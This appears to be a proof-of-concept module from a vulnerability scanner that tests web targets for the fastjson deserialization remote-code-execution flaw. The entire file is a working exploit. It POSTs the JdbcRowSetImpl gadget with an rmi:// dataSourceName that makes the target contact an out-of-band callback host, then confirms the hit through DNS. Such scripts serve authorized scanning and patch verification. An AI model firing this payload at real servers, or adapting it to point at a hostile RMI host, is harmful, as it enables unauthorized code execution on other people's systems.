#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import time
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'fastjson rce'
        self.keyword = ['fastjson']
        self.info = 'fastjson rce'
        self.type = 'rce'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
                self.url_normpath(self.url, '')
            ]))
            for path in path_list:
                dns = self.ceye_dns_api(t='dns')
                url = path
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
                data = {
                    "@type": "com.sun.rowset.JdbcRowSetImpl",
                    "dataSourceName": "rmi://" + dns + "/Object",
                    "autoCommit": True
                }
                res = self.curl('post', url, headers = headers, json = data)
                time.sleep(5)
                if self.ceye_verify_api(dns,'dns'):
                    self.flag = 1
                    self.req.append({"flag": url})
                    self.res.append({"info": url, "key": "fastjson rce"})
